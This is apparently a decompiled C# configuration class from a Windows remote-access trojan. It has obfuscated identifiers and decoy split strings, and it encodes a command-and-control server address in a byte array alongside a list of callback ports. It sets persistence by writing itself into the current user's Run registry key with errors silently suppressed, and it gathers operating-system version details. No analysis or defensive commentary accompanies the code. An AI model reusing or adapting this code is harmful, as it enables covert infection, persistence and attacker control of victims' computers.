using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace rlbwrarhsa;

internal static class DLAONIF
{
	public static string rlbwrarhsaappPath = Application.get_ExecutablePath().ToString();

	public static string rlbwrarhsadefaultP = "101.155.260.18|rlbwrarhsa".Split(new char[1] { '|' })[0];

	public static string rlbwrarhsamainApp = "rlbwrarhsa|rlbwrarhsa".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 6828, 8661, 10614, 14822, 18443 };

	public static byte[] rlbwrarhsavpsips = new byte[14]
	{
		49, 54, 55, 46, 49, 49, 52, 46, 49, 51,
		56, 46, 49, 50
	};

	public static int rlbwrarhsaport;

	public static string rlbwrarhsapc_id = "theba|rlbwrarhsa".Split(new char[1] { '|' })[0];

	public static string rlbwrarhsaremvUser = "drbianca|rlbwrarhsa".Split(new char[1] { '|' })[0];

	public static string rlbwrarhsafilesLogs = "ulramara".Split(new char[1] { '|' })[0];

	public static string rlbwrarhsaAppPath = "";

	public static string rlbwrarhsaget_mpath()
	{
		return Path.GetDirectoryName(rlbwrarhsaappPath) + "\\";
	}

	public static void rlbwrarhsaset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|rlbwrarhsa".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			string text = rlbwrarhsapc_id;
			object value = registryKey.GetValue(text + app);
			if (value == null)
			{
				registryKey.SetValue(text + app, path);
			}
			else if (value.ToString() != path)
			{
				registryKey.SetValue(text + app, path);
			}
		}
		catch
		{
		}
	}

	public static byte[] getByteArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string rlbwrarhsaOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!rlbwrarhsa".Split(new char[1] { '!' })[0];
		}
	}
}
